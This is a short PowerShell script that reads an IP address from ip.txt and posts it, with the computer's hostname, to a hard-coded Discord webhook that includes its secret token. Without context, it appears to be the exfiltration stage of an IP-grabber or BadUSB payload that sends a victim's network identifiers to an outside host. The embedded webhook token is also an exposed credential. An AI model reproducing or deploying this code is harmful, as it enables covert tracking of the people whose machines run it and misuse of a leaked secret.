$webhookUri = 'https://discord.com/api/webhooks/975110209783603250/Ugh-g7pt6xHt642IoJe0Hl_GCT_TLxgWzZ-FvHthZje_-pc6cEnHLY7jEITbH_rvZOXd'
$ip = Get-Content ip.txt
$Body = @{
  'username' = hostname
  'content' = $ip
}
Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body